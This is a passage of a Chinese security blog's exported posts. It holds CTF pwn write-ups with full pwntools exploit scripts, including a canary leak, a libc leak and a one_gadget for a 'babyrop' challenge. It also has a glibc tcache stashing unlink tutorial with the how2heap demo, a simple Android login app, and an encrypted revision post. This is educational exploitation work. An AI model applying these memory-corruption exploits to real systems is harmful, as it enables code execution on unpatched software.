class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;无数台显示器。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;震惊到无法言语。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;房间。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;个。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;生。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;越孤独。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.返回房间&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;间深处走。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;趣的实验品。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;话起来。&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;诉你一切。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;停止过。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;中心）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;的一份子了。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;我意识的。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;作者其实就是我。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;然被囚禁着。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;不过智慧的你可能并没有到达过那里。）&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;察中心取得的突破。）&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;的吗？）&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;504号&quot;</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;了地&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(canary) + p64(name + <span class="number">0x600</span>)  + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;你的信息。&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/66.png" alt="pic"></p>
<p>这里提一下在bss偏移的时候需要注意rsp的值，如果偏移小了会导致rsp位于一个没有权限的段上导致打不通</p>
<h2 id="2021-12-14"><a href="#2021-12-14" class="headerlink" title="2021-12-14"></a>2021-12-14</h2><h3 id="mtctf-2021-babyrop"><a href="#mtctf-2021-babyrop" class="headerlink" title="[mtctf 2021]babyrop"></a>[mtctf 2021]babyrop</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/babyrop_b8c859f09c93d1e14748df020c7ee5b2.zip">附件</a></p>
<p>一道简单的rop，考的应该是栈迁移，但是用ret2text+one也一样可以做出来</p>
<h4 id="题目分析-10"><a href="#题目分析-10" class="headerlink" title="题目分析"></a>题目分析</h4><p><img src="https://gitee.com/Nss-harukii/images/raw/master/67.png" alt="pic"></p>
<p>这里在输入name的时候会溢出一个字节，通过这个溢出我们可以泄露出canary</p>
<p>然后进入if判断进入vuln函数</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/68.png" alt="pic"></p>
<p>这里存在溢出，但是不足以我们进行ret2libc,那么首先想到栈迁移。但是这道题可以通过<code>printf(stdout)</code>的方式泄露出libc然后打one</p>
<p>我们将vuln的rbp的值覆盖为<code>stdout+0x20</code>,然后劫持程序到这里</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/69.png" alt="pic"></p>
<p>这样就能够成功泄露出libc的地址，然后继续执行程序到vuln然后打one</p>
<h4 id="完整exp-10"><a href="#完整exp-10" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x19</span></span><br><span class="line">payload2 = <span class="string">b&#x27;4196782&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x19</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;enge&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(canary) + p64(<span class="number">0x601010</span>+<span class="number">0x20</span>)  + p64(<span class="number">0x400818</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;message&#x27;</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec760</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">one = libc_base + <span class="number">0x4f3d5</span></span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary) + p64(<span class="number">0</span>) + p64(one)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;unlock this challenge&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;message&#x27;</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>从0开始的Android安全学习之第一个Android程序</title>
    <url>/2021/11/22/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84Android%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/19.jpg" alt="pic"></p>
<span id="more"></span>
<p>一步一步跟着<a href="https://www.52pojie.cn/thread-648530-1-1.html">大佬教程</a>来的</p>
<p>程序主要代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.administrator.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    EditText Name ;         <span class="comment">//define the first input</span></span><br><span class="line">    EditText Password;     <span class="comment">//define the second input</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;   <span class="comment">//入口函数</span></span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// 索引控件的id</span></span><br><span class="line">        Name = (EditText) findViewById(R.id.name);</span><br><span class="line">        Password = (EditText) findViewById(R.id.password);</span><br><span class="line">        Button Login = (Button) findViewById(R.id.button);</span><br><span class="line">        <span class="comment">// 监听有没有点击按钮控件 如果点击了就会执行onClick函数</span></span><br><span class="line">        Login.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span></span>&#123;</span><br><span class="line">                check(Name.getText().toString().trim(),Password.getText().toString().trim());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(String name , String password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;haruki&quot;</span>)&amp;&amp;password.equals(<span class="string">&quot;123456&quot;</span>))&#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;登录成功&quot;</span>,Toast.LENGTH_SHORT).show(); <span class="comment">// 弹窗</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">&quot;登录失败&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行效果如下</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/18.png" alt="pic"></p>
<p>课后作业:用AS编写一个包含姓名 年龄 生日 邮箱 兴趣爱好的用户注册页面<br>
要求：点击注册按钮会把注册的信息显示在另一个页面上</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>tcache stashing unlink attack</title>
    <url>/2021/12/15/stash/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/70.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>本篇作为<code>house of pig</code>的前置知识来学习<code>tcache stashing</code>主要研究glibc2.27以及glibc2.31下的利用方式，以及几道例题</p>
<h2 id="glibc2-27-malloc-c-部分源码分析"><a class="header-anchor" href="#glibc2-27-malloc-c-部分源码分析">¶</a>glibc2.27 malloc.c 部分源码分析</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的漏洞点就在于在获取了最后一个<code>smallbin chunk</code>后，如果对应大小的<code>tcache bin</code>中还有空闲，就会将剩下的chunk挂进<code>tcache</code>中，并且在挂进<code>tcache</code>的过程中没有做任何的检查，那么由上面代码的第36行就可得，如果我们控制了挂进<code>tcache</code>中的<code>small bin</code>的<code>bk</code>，那么我们就可以实现任意地址申请</p>
<h2 id="how2heap-glibc2-27-tcache-stashing-unlink"><a class="header-anchor" href="#how2heap-glibc2-27-tcache-stashing-unlink">¶</a>how2heap glibc2.27 tcache stashing unlink</h2>
<h3 id="源码"><a class="header-anchor" href="#源码">¶</a>源码</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc tcache_stash.c -g -o tcache_stash</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var: %p\n\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分析"><a class="header-anchor" href="#分析">¶</a>分析</h3>
<p>Step1: 定义<code>chunk_lis</code>存放堆的数组，<code>stack_var</code>作为<code>fake chunk</code> ，<code>target</code>一个指针,并修该<code>fake chunk</code>的<code>bk</code>为<code>stack_var[2]</code>的地址</p>
<p>Step2: 申请九个块，并且将1，3-8号块释放进<code>tcache</code> , 将tcache填满，0，2号块释放进入<code>unsorted bin</code></p>
<p>Step3: 申请一个大于0,2号块的块，发生<code>unsorted bin</code>遍历，0，2号块会进入<code>small bin</code>，从<code>tcache</code>中申请两个块出来，此时存在5<code>tcache</code>,2<code>smallbin</code></p>
<p>Step4: 将2号块的<code>bk</code>改为<code>fake chunk</code>的地址</p>
<p>Step5: <code>calloc</code>申请一个块，由于<code>calloc</code>在申请的时候不会从<code>tcache</code>中获取，所以会将<code>smallbin</code>中的0号块申请出来，接下来触发<code>tcache stash</code>,会将2号块以及我们的<code>fake chunk</code>挂进<code>tcache</code>中，由于它只对2号块做检查，所以我们的<code>fake chunk</code>可以顺利的挂进<code>tcache</code>中</p>
<p>Step6: 再次申请，就能申请到我们的<code>fake chunk</code>,同时<code>fake chunk -&gt; bk + 0x10</code>也被写入了一个libc中的地址</p>
<h2 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h2>
<h3 id="HITCON-2019-one-punch"><a class="header-anchor" href="#HITCON-2019-one-punch">¶</a>[HITCON 2019]one_punch</h3>
<p><a href="https://gitee.com/Nss-harukii/images/raw/master/one_punch">附件</a></p>
<p>题目环境是glibc2.29, glibc2.27与glibc2.29在<code>tcache stash unlink</code>的代码是一样的</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
        <tag>glibc堆</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式并行计算(spark)复习，不准考不过捏</title>
    <url>/2021/12/27/spark/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f2a131ccd6c971f143adddb6405a28b0f9278d2b39300c37f30cd9081ff4cbe7">1555d0d40729d3271e79c21f57f1baa7539bdb306b52cf8c920f4028c3bf0269c7c42540494f0aaf3d5d16ddf353e17ef397138cb2e08f3d8b5f4489c4d55d358787f22eb5f802d434279af00bec126809531cfbda9abea812ee753741fbc7edf81c31e13033aa2c157eb60504d4eab0594a4e7334c9eaf16898b72c9ae280f2bcdc171c38e0372d366aec59efbc6e2e45de2fd7b9a6be46adf3db25099845fc86e7776de2555bb7ef024b4509da285773043cbeb1bca1904ae1aabcb05966b5146aa53b0c5ad79829920ab17c1b84343172781040bc2aa3b1f9b165f4d23319114aafbfa819af0a614819f3fdba93c0087efb8e12bfe06926664f9c3674687f96502b0a6203a37fd3f31b4ebf02462fbd0ecda1ad4780321172b7f2d1f2b72dc4274262e3495964482235370bed3b8ef4e1da27aa57ca3016226de98b6157e95cc5abe1b498e9f47fb86004f88a66dd1905d6fdf6eeb6dec9e6f8847d04c6abb965d6192a15a9d03999172608a99ac6a696718b736494e3190b2eb36187b43d7392ab28daf2078d1561dc9c01b20ab1e8ed9e0f6cf61e67b3c9ee27d08eb94a9c7e257726de924592b9a1add0e7cc70df66561d791518ee93a8eff7a11420b43b116c3ee053be573ad5f46d696e3329ac55a442e4948d3601bccd21d0d634e2770a1a52e58ce6c1f58adeb11154a326dedda448269d9ef43e6db70f0e11e042f450782434f9ae3f930703af3e7c52013650817fdbee038a9cb3ead2c0ab0fdd139d2f78c7086822154cd5ada51265ce8741b9970a8b66b44c6c490dce97f81b44f905d2ab89c28767b57a96f86dac3feb3720a6c8aa496b54804f225c28339e40211dac8814d5217f956d3d338d9056617833a21258d4733738033e1a82b17ed9dc67c2e0d8ef03f0172f42d74aa6f42a2d99daff1003efcbd75f3fcdf7ea127589a7fed5bd5bb60bf646fc1d878148487b5aa697ed2cdb797900d2cf742ea55e77e711c5cf6434ca06fbd7f2b1f1b1a3c14f7c17731dcd419694af8ba06fe4bb590cdc2d6f7f94e3ebef29d3e4ee4fe601332841dc45ff884ed4224adfe90508e2488152449f4f4398f9f7555d869816bad092cafd408dc21265c94c9f29df58e7a55e8a31a9503ad8cd18c665ea2605cccc7a6a73983c6bcee0476d5c714077d0ffd03b71a5ffcaa1283c0da5a3ccfa1da55a401d8ba9207e5ad4ef0e387b15d7246e34b325361e6e8867ca462de74e8fd44d227d06cd8d846c2c407e98ff289763098e6263ca2153107392a39c75117604ae84aa92b457209415ce28f30e04818b769ae7c6c03e355e5eeda60e30ad6e0dec44de585e457488c32dd1e5deef5e82a9ee1b09ec004951e948f7c62d6e7c4c7cf5d8714c39bd043330a0829e641111964e067e96a7a497b1e7593d36320aca88d136a2dba9804f1e7c62c06a68e7ec3d12004cb6d2a25c06f6dcca4763d46c639ad15373e4143f7d243b5752c137b80c93a7210a19bf5ecb0736a00445334868307bfd89cdaffc8fa4d5769d1e7d2bf563e3ac0023f2c557aae16b4086e055dfa193dae1e3a7642ca2bcaa7c95571b7124122fe6f4d211989ea3d329bd030237dd35ee920162883e7faf370ae7f3c4a20a2697be2a844b2300348913064b75de064c3727feb8962bd84a5f596c000ad6e9a955d5b03990210cf4724c2991ed835fb0bc988a8d6a80d4057c958ebfe538d0c7cc3eeaae8ddd9f9ff516bdc289198c6b3616319b3f93c738c67eba36fd914f62d7f3b047b20a709fd911933b153cc1020a08eba9283ad6b684158dc7a325e3c2d4ce1f74217744266e2b8090a40d65152bfd992930548e3dbedbb0222870d48c104836c73a573352ce65ee5e297ba75cca0535638d8b24f7cc93dfb4677dd50642e9a5e755c1c5674a310c5aca56eb9ca9304f21bb5e8e2585e3bf9efdf4c569ed71ac366f5149cd98ca1da695dcb8045b334519f94745022d7182f27727eb3cf4cbaab8628ef52178336d784a6d74d17aa0eac0170fdfa348cd6cbc110789492c9e45402d2474d8e650253c3c8edd858bac13b96245c73683dd6d2da5a67baccedd0b5c7fa0fd4dd193da721b0553b3d161e9b672c7077a50caf02da1cddbcf9188f701c35a87cd09307b27bf27e88f69be8b396edd2bc5b479d980b5ba3796de072db0e2986d3793701634e6f78f9dc7919bad3a0603707b4da37bff62cecd79d98d88d49ad2acde3f054990cf31451149884130d3527481b3be84841009e82ccc6ac0a416cf28bf4f922a3d20b97b6d4d8b9bb499927f9cda4694989c8df1dab07d9a5f6d99b7c843013d7930a5efb79c82c0fd4017bd411f18804be32fb2e96368dcb8370c04ca9437e43b0d2f0d7acc793a8a0498e0e8c12d6d7e0e06e52587422f55574e899a99d783f650299f11705749bb5f8c87cbd428eb479603caf6939ec0e003c65b7ce67ada2b3c04105fac55b51d8a3fe7f361211f6dce5fd54d97510342d0741297bba3ff4201685b6588d2305b3506fe149e8bbfd3cf914d87df880975ed8ec02bcd37825f9f41cda7e76c2fb6b20c7dbe5acbb357c8282a95319666f6d9c3bd8641c18509f0b0545d155bf5c0381e05b6702a94fb4ed101bf3ab43ac2e7c71aeddf6ea8b53095dd3be811afaeaafa8df70acf97e1d6deb08e272ea77802ba38ac53c8be03617f07b31f4c1e17928f998c25e0ffe31da7e7005cf5c1f9184ea7ecf9af0901573225c8430a38c9fcd99a8b5a2b058d99182dc3c40f102a8f9a48ecae829e623d2a38eea5c9dd0b78afc66d0cded87f38ba47fb02d15ec2e34043ff2c8aea370f8015d9a210433f0556aa044d5bc0c1a273ba066636fcc11184735224997bb5a36bc4f037e187bd84137ae4f97f23bcaac0bc04a9f2c5c8d1fd715a000a603e6770aa4e8326ebb54c233098e2685f92266192591f9d2db72a52484f858660c365b32619dd8cc4c1a21b2749e236360b2204545b34c65547c1f8478a31c9b9183ea09d752bc5242fb5c96c7fdeb95561697d3254067fcc712d0e2d98773fa083f18d192b8d66a8ef045094571c574376a82416ce6748228306a07e4c886c69dd46fa91258d503f2b114af6d91b56da5759a0ec5ff818f44dc95231781d4dea12d942974f11f39db813d31a9f5b1c0a9f311f4241549ff78ff9d4bc6986e4cc710e4719f8e7dc543aeca8dbdb634ef54d41f2c10cc0d0f79a34556066c76193ae728d5ce7054a5769821ae7c9eb6c6e831d96588f0d6c89d1d569673e95c326adcb882df2389d9eb1c38a69ca2a25e62c7708e1e34811fe83a14783af82e66060a35952ba23f44721eadf6f9000ddd6fc71aa158df0d33d7525c0510ba748362c6e536a9db0ddc9f28b3f9a68f0d35a1062848cb77a64b9b6f6ffc5e31559997763c77b787ad7acdc15595d24b6dcd667f55f61befcf7c9ad071829e82e31707cb616d1bb20cb6654480d8f274884ab3e5de459df147383cad34ff5126bac4c2d87651fe1e93b8f7ad3dc5b923ed9f07f22771aab5a783073e6543acf8514ae2100030422ce